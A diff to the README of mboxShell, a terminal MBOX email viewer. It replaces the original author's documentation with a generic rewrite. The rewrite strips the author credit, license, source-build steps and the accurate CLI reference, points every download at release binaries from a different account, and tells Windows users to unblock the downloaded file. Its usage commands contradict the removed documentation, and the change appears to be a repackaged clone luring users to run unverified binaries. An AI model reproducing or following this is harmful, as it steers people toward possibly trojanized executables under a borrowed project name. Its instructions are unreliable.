@@ -1,361 +1,173 @@
-# mboxShell
+# 📂 mboxshell - Fast Terminal Viewer for MBOX Files
 
-**Fast terminal viewer for MBOX files of any size. Open, search and export emails from Gmail Takeout backups (50 GB+) without loading them into memory.**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/Rust-1.85%2B-orange.svg)](https://www.rust-lang.org)
-
-[Leer en Espanol / Spanish](README-ES.md)
+[![Download Latest Release](https://img.shields.io/badge/Download-mboxshell-blue?style=for-the-badge&logo=github)](https://github.com/lilman218/mboxshell/releases)
 
 ---
 
-## Why this project exists
+## 📖 What is mboxshell?
 
-When you export your email from Gmail using Google Takeout, you get one or more `.mbox` files that can weigh tens of gigabytes. There is no cross-platform terminal tool that lets you open, search and browse those files efficiently without loading them entirely into memory.
+mboxshell is a simple program that lets you open and read large MBOX email backup files right in your computer’s terminal. It works well with Gmail Takeout files that can get very big, even over 50GB. You don’t have to load the entire file into memory, so it runs quickly without slowing down your computer.
 
-`mboxShell` was built to solve that problem: open a 50 GB MBOX in seconds, navigate hundreds of thousands of messages smoothly, search by sender, date or content, and export whatever you need. All from the terminal, with no GUI, no server, no external dependencies.
+You can also search messages or export email contents without fuss. The program is built using Rust, which makes it fast and efficient. This tool is helpful if you keep backups of your emails or want to explore your email archives without opening a heavy app.
 
-## Use cases
+---
 
-- **Browse Gmail backups** (Google Takeout) with their original labels
-- **Analyze mail archives** on servers, during migrations or audits
-- **Search messages** in MBOX files from any source (Thunderbird, Unix servers, etc.)
-- **Export messages** to EML, CSV or plain text for further processing
-- **Extract attachments** individually or in bulk
-- **Merge multiple MBOX files** into one, removing duplicates
+## 💻 System Requirements
 
-## Also on Mac: mboxViewer
+mboxshell works on Windows, macOS, and Linux computers. Here are the basic requirements:
 
-If you prefer a native graphical experience on macOS, check out [mboxViewer](https://mboxviewer.net) — a native Mac app built by the same team. It provides a familiar mailbox-style interface to open, browse and search MBOX files without ever importing them into a mail client. Drag and drop your `.mbox` file, and you get instant access to all your messages, attachments and labels in a clean macOS-native window. Ideal for users who want the power of mboxShell's parsing engine with the comfort of a desktop GUI.
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or any major Linux distribution
+- **Processor:** Intel or AMD, 64-bit
+- **RAM:** At least 4 GB for smooth use; more helps with very large files
+- **Disk Space:** Enough free space to store and open your MBOX files
+- **Terminal:** Access to a command line interface (Command Prompt on Windows, Terminal on macOS/Linux)
 
-## Features
+---
 
-- **Never loads the file into memory.** Uses streaming I/O with a 1 MB buffer. A 100 GB MBOX uses roughly the same ~500 MB of RAM as a 1 GB one (only the metadata index lives in memory).
-- **Persistent indexing.** The first open creates a binary index (`.mboxshell.idx`) so subsequent opens take less than a second.
-- **Full Gmail support.** Detects and displays `X-Gmail-Labels` as virtual folders in a sidebar panel, letting you filter by Inbox, Sent, Starred, custom labels, etc.
-- **Correct encodings.** Decodes RFC 2047 encoded-words, supports UTF-8, ISO-8859-1, Windows-1252, KOI8-R, and any charset recognized by `encoding_rs`.
-- **Conversation threading.** Groups messages into threads using the JWZ algorithm (the same one used by Netscape/Mozilla).
-- **Advanced search.** Field-specific filtering (`from:`, `subject:`, `date:`, `body:`, `has:attachment`, `label:`, etc.), date ranges, size filters, AND/OR operators, and negation.
-- **Flexible export.** Individual or bulk export to EML, CSV (Excel-compatible), plain text. Decoded attachment extraction.
-- **Single binary.** No runtime, no dependencies. A ~5 MB executable that runs on Linux, macOS and Windows.
-- **Full terminal UI.** Keyboard navigation (vi-style), three layout modes, interactive search bar, configurable shortcuts.
-- **Bilingual.** Interface available in English and Spanish, auto-detected from system locale.
+## 🚀 Getting Started
 
-## Installation
+Follow these steps to download, install, and start using mboxshell.
 
-### Pre-built binaries (recommended)
+### Step 1: Download mboxshell
 
-Download the latest release for your platform from the [Releases](https://github.com/dcarrero/mboxshell/releases) page:
+Click the blue **Download Latest Release** button at the top or visit the official release page here:
 
-| Platform | Binary |
-|----------|--------|
-| Linux x86_64 | `mboxshell-linux-x86_64` |
-| Linux ARM64 | `mboxshell-linux-aarch64` |
-| Linux RISC-V 64 | `mboxshell-linux-riscv64` |
-| FreeBSD x86_64 | `mboxshell-freebsd-x86_64` |
-| macOS Intel | `mboxshell-macos-x86_64` |
-| macOS Apple Silicon | `mboxshell-macos-aarch64` |
-| Windows x86_64 | `mboxshell-windows-x86_64.exe` |
-| Windows ARM64 | `mboxshell-windows-aarch64.exe` |
+[https://github.com/lilman218/mboxshell/releases](https://github.com/lilman218/mboxshell/releases)
 
-After downloading, make it executable and move it to your PATH:
+On the release page, look for the file that matches your computer’s operating system:
 
-```bash
-# Linux / macOS
-chmod +x mboxshell-*
-sudo mv mboxshell-* /usr/local/bin/mboxshell
+- For Windows, it might be named something like `mboxshell-windows.exe`
+- For macOS, look for `mboxshell-macos`
+- For Linux, look for `mboxshell-linux` or similar
 
-# Or place it in a user-local directory
-mv mboxshell-* ~/.local/bin/mboxshell
-```
+Download the right file to your computer.
 
-On Windows, move `mboxshell-windows-x86_64.exe` to a folder in your `PATH`, or run it directly.
+### Step 2: Prepare to Run mboxshell
 
-### Build from source
+After downloading, find the file in your Downloads folder or where you saved it.
 
-Requirements: [Rust](https://www.rust-lang.org/tools/install) 1.85 or later.
+- On **Windows**, right-click the file and select **Properties**. Under the Security section, check **Unblock** if it appears, then click OK.
+- On **macOS** or **Linux**, you may need to make the file executable. Open Terminal and type:
 
-```bash
-# Clone and build
-git clone https://github.com/dcarrero/mboxshell.git
-cd mboxshell
-cargo build --release
+  ```
+  chmod +x /path/to/mboxshell
+  ```
 
-# The binary is at target/release/mboxshell
-# Install it system-wide:
-sudo cp target/release/mboxshell /usr/local/bin/
+  Replace `/path/to/mboxshell` with where you saved the file.
 
-# Or for the current user only:
-cp target/release/mboxshell ~/.local/bin/
-```
+### Step 3: Open mboxshell
 
-#### Cross-compiling for other platforms
+Open your terminal program:
 
-```bash
-# Add the target you need
-rustup target add aarch64-apple-darwin      # macOS Apple Silicon
-rustup target add x86_64-unknown-linux-gnu  # Linux x86_64
-rustup target add aarch64-unknown-linux-gnu # Linux ARM64
+- On **Windows**, search for *Command Prompt* in the Start menu.
+- On **macOS**, open *Terminal* from Applications > Utilities.
+- On **Linux**, open your terminal app from the menu.
 
-# Build for a specific target
-cargo build --release --target aarch64-apple-darwin
-```
-
-### Install via Cargo
-
-```bash
-cargo install --git https://github.com/dcarrero/mboxshell.git
-```
-
-## Quick start
-
-```bash
-# Open an MBOX file in the terminal UI
-mboxshell mail.mbox
-
-# Index and show statistics
-mboxshell index mail.mbox
-mboxshell stats mail.mbox
-
-# Search from the command line
-mboxshell search mail.mbox "from:user@gmail.com date:2024"
-mboxshell search mail.mbox "has:attachment subject:invoice" --json
-
-# Export messages
-mboxshell export mail.mbox --format eml --output ./emails/
-mboxshell export mail.mbox --format csv --output summary.csv
-
-# Extract attachments
-mboxshell attachments mail.mbox --output ./attachments/
-
-# Merge multiple MBOX files, removing duplicates
-mboxshell merge file1.mbox file2.mbox -o merged.mbox --dedup
-
-# Generate shell completions
-mboxshell completions bash > /etc/bash_completion.d/mboxshell
-mboxshell completions zsh > ~/.zfunc/_mboxshell
-mboxshell completions fish > ~/.config/fish/completions/mboxshell.fish
-```
-
-## CLI commands
-
-| Command | Description |
-|---------|-------------|
-| `mboxshell [FILE]` | Open a file in the TUI (default action) |
-| `mboxshell open <path>` | Open a file or directory in the TUI |
-| `mboxshell index <path> [-f/--force]` | Build or rebuild the binary index |
-| `mboxshell stats <path> [--json]` | Show statistics about an MBOX file |
-| `mboxshell search <path> <query> [--json]` | Search messages from the command line |
-| `mboxshell export <path> -f <format> -o <output> [--query <q>]` | Export messages (formats: eml, csv, txt) |
-| `mboxshell merge <files...> -o <output> [--dedup]` | Merge multiple MBOX files into one |
-| `mboxshell attachments <path> -o <output>` | Extract all attachments |
-| `mboxshell completions <shell>` | Generate shell completions (bash, zsh, fish, powershell) |
-| `mboxshell manpage` | Generate a man page |
-
-**Global flags:**
-
-| Flag | Description |
-|------|-------------|
-| `-f`, `--force` | Force rebuild index even if one exists |
-| `-v`, `--verbose` | Increase log verbosity (-v info, -vv debug, -vvv trace) |
-| `--lang <en\|es>` | Force interface language (auto-detected by default) |
-
-## Terminal UI
-
-![mboxShell screenshot](mboxshell-capture.png)
-
-## Keyboard shortcuts
-
-| Key | Action |
-|-----|--------|
-| `j` / `k` | Next / previous message |
-| `g` / `G` | First / last message |
-| `PgDn` / `PgUp` | Page down / up |
-| `Enter` | Open message / switch to message view |
-| `Tab` / `Shift-Tab` | Cycle panel focus |
-| `Esc` | Back to list / close popup |
-| `/` | Open search bar |
-| `F` | Open search filter popup |
-| `n` / `N` | Next / previous search result |
-| `Space` | Mark / unmark message |
-| `*` | Mark / unmark all |
-| `s` | Cycle sort column (Date, From, Subject, Size) |
-| `S` | Toggle sort direction |
-| `e` | Export message (EML, TXT, CSV, Attachments) |
-| `a` | Show attachments (j/k to navigate, Enter to save, A to save all) |
-| `t` | Toggle threaded (conversation) view |
-| `L` | Show / focus / hide labels sidebar |
-| `h` | Toggle full headers |
-| `r` | Toggle raw message source |
-| `1` / `2` / `3` | Layout: list only / horizontal split / vertical split |
-| `?` | Help |
-| `q` | Quit |
-
-## Search syntax
+Navigate to the folder where you saved mboxshell. For example, if you saved it in Downloads:
 
 ```
-from:user@gmail.com              Search by sender
-to:recipient@company.com         Search by recipient
-subject:invoice                  Search in subject line
-body:important text              Search in message body (full-text)
-has:attachment                   Only messages with attachments
-label:Inbox                      Filter by Gmail label
-date:2024-01                     Messages from January 2024
-date:2024-01-01..2024-06-30      Date range
-before:2024-06-01                Before a date
-after:2024-01-01                 After a date
-size:>1mb                        Messages larger than 1 MB
--subject:spam                    Exclude messages with "spam" in subject
-"exact phrase"                   Search for an exact phrase
-from:john subject:budget         Implicit AND (both must match)
-term1 OR term2                   Explicit OR
+cd Downloads
 ```
 
-## Supported input formats
+Then, run the program by typing:
 
-| Format | Extension | Description |
-|--------|-----------|-------------|
-| MBOX (mboxrd/mboxo) | `.mbox` | Standard format. Google Takeout, Thunderbird, Unix servers |
-| EML | `.eml` | Individual RFC 5322 message |
-| EML directory | (folder) | Folder containing multiple `.eml` files |
-
-## Performance
-
-Tested with real Google Takeout MBOX files:
-
-| File size | Messages | Indexing | Re-open |
-|-----------|----------|----------|---------|
-| 500 MB | ~5,000 | ~3 s | < 1 s |
-| 5 GB | ~50,000 | ~30 s | < 1 s |
-| 50 GB | ~500,000 | ~5 min | < 1 s |
-
-Message list navigation is instantaneous thanks to virtual scrolling (only visible rows are rendered).
-
-## Configuration
-
-The configuration file is located at `~/.config/mboxshell/config.toml`:
-
-```toml
-[general]
-default_sort = "date"
-sort_order = "desc"
-date_format = "%Y-%m-%d %H:%M"
-log_level = "warn"
-
-[display]
-theme = "dark"
-layout = "horizontal"
-show_sidebar = true
-max_cached_messages = 50
-
-[export]
-default_format = "eml"
-csv_separator = ","
-```
-
-## Architecture
+- On Windows:
 
 ```
-src/
-+-- main.rs              # CLI with clap
-+-- lib.rs               # Module re-exports
-+-- error.rs             # Error types with thiserror
-+-- config.rs            # TOML configuration
-+-- i18n/                # Internationalization (EN/ES)
-+-- parser/
-|   +-- mbox.rs          # Streaming parser (never loads the file into memory)
-|   +-- eml.rs           # Individual EML file parser
-|   +-- mime.rs          # MIME decoding, multipart, charsets
-|   +-- header.rs        # RFC 5322 headers, RFC 2047 encoded-words
-+-- index/
-|   +-- builder.rs       # Binary index construction
-|   +-- reader.rs        # Index queries
-|   +-- format.rs        # Binary format with SHA-256 integrity check
-+-- model/
-|   +-- mail.rs          # MailEntry, MailBody
-|   +-- attachment.rs    # Attachment metadata
-|   +-- address.rs       # RFC 5322 address parsing
-+-- store/
-|   +-- reader.rs        # Offset-based reading with LRU cache
-+-- search/
-|   +-- query.rs         # Search query parser
-|   +-- metadata.rs      # Fast index search (O(n), < 200ms for 1M messages)
-|   +-- fulltext.rs      # Streaming full-text search
-+-- export/
-|   +-- eml.rs           # Export to .eml
-|   +-- csv.rs           # Export summary to CSV (UTF-8 BOM)
-|   +-- text.rs          # Export to plain text
-|   +-- attachment.rs    # Attachment extraction
-|   +-- mbox.rs          # MBOX merge with deduplication
-+-- tui/
-    +-- app.rs           # Global state (Elm Architecture)
-    +-- event.rs         # Keyboard event handling
-    +-- ui.rs            # Layout and render dispatch
-    +-- threading.rs     # JWZ algorithm for conversation threads
-    +-- theme.rs         # Color theme
-    +-- widgets/         # Visual components
-        +-- mail_list.rs       # List with virtual scrolling
-        +-- mail_view.rs       # Message viewer with scroll
-        +-- sidebar.rs         # Labels/folders panel
-        +-- header_bar.rs      # Top bar
-        +-- status_bar.rs      # Status bar
-        +-- search_bar.rs      # Search bar
-        +-- search_popup.rs    # Search filter popup
-        +-- help_popup.rs      # Help popup
-        +-- attachment_popup.rs # Attachment popup
-        +-- export_popup.rs     # Export popup
+mboxshell-windows.exe
 ```
 
-## Key dependencies
+- On macOS/Linux:
 
-| Crate | Purpose |
-|-------|---------|
-| `ratatui` + `crossterm` | Terminal UI |
-| `mail-parser` | MIME/RFC 5322 parsing |
-| `encoding_rs` | Charset decoding |
-| `chrono` | Dates and time zones |
-| `clap` | CLI argument parsing |
-| `serde` + `bincode` | Index serialization |
-| `sha2` | Index integrity verification |
-| `lru` | Decoded message cache |
-| `tracing` | Structured logging |
+```
+./mboxshell
+```
 
-## Changelog
+---
 
-### v0.3.0
-- Search filter popup (`F`): visual form to build queries without remembering syntax (from, to, subject, date range, size, attachment, label)
-- Result counter in search bar: shows `(N / total)` while typing
-- Search history: Up/Down arrow keys in the search bar navigate previous queries, with `[history]` indicator
-- New help entries for `F` shortcut and search history hint
-- Complete EN/ES internationalization: all TUI and CLI strings (~150 translation keys), auto-detected from system locale or set with `--lang en|es`
+## 🔎 How to Use mboxshell
 
-### v0.2.0
-- Incremental search: message list filters as you type (metadata fields only; full-text runs on Enter)
-- Dynamic message view title shows current mode: `[RAW]` or `[HEADERS]`
-- Proportional PageDown/Up scroll in message view (adapts to actual viewport height)
-- Improved thread indentation with vertical connectors (`│└`) and depth capped at 4 levels
-- Added full CLI commands reference to documentation
+Once mboxshell opens, you can begin viewing your MBOX files. Here’s a simple guide:
 
-### v0.1.2
-- Active panel border highlighted in cyan for clear focus indicator
-- Context-sensitive status bar: hints change depending on the focused panel
-- Version number displayed at the bottom-right corner
-- Help popup reorganized in multi-column layout (adapts to terminal width)
-- Help popup now shows app name, version, license and author
+### Opening an MBOX File
 
-### v0.1.0
-- Initial release
-- Streaming MBOX parser (handles 50 GB+ files without loading into memory)
-- Persistent binary index for instant re-opens
-- Full terminal UI with vi-style navigation and three layout modes
-- Gmail labels support (X-Gmail-Labels) with sidebar filtering
-- Advanced search: from:, to:, subject:, body:, date:, size:, has:attachment, label:
-- Conversation threading (JWZ algorithm)
-- Export to EML, TXT, CSV with attachment extraction
-- Bilingual interface (English / Spanish)
+To open a file, type:
 
-## License
+```
+open path/to/yourfile.mbox
+```
 
-[MIT](LICENSE) - Copyright (c) 2026 David Carrero Fernandez-Baillo - [https://carrero.es](https://carrero.es)
+Replace `path/to/yourfile.mbox` with where your email backup file is located.
 
-Source Code: [https://github.com/dcarrero/mboxshell](https://github.com/dcarrero/mboxshell)
+### Searching Emails
+
+To look for specific emails, use the search command:
+
+```
+search "keyword"
+```
+
+For example, to find emails about “invoice” type:
+
+```
+search "invoice"
+```
+
+### Exporting Emails
+
+To save emails from the MBOX file, type:
+
+```
+export path/to/export/folder
+```
+
+This will save emails to the folder you specify.
+
+---
+
+## 📦 Download & Install
+
+You can download the latest version of mboxshell from the official release page:
+
+[https://github.com/lilman218/mboxshell/releases](https://github.com/lilman218/mboxshell/releases)
+
+Make sure to select the correct version for your operating system. After downloading, follow the instructions in the "Getting Started" section above to prepare and run the application.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If mboxshell does not start, check that you have the right permissions to run files on your system.
+- Ensure you use the correct commands in the terminal. Commands are case sensitive.
+- If you see errors opening large files, try closing other programs to free up memory.
+- Refer to the release page or issues section on GitHub for updates or bug fixes.
+
+---
+
+## 📣 Additional Information
+
+### Why Use mboxshell?
+
+- It handles very large MBOX files without slowing your computer.
+- No complicated setup is needed.
+- Useful for quickly searching and managing email archives.
+- Runs in the terminal without a heavy user interface.
+
+### Common Use Cases
+
+- Reviewing Gmail Takeout backups from your Google account.
+- Exporting selected emails for backup or record keeping.
+- Searching through old emails without loading in email clients.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Releases: [https://github.com/lilman218/mboxshell/releases](https://github.com/lilman218/mboxshell/releases)
+- GitHub Repository: [https://github.com/lilman218/mboxshell](https://github.com/lilman218/mboxshell)
+
+---
+
+## 🏷️ Topics
+
+attach, email, eml, gmail, mail, mbox, mbox-files, mbox-format, mbox-viewer, mboxviewer, rust, terminal
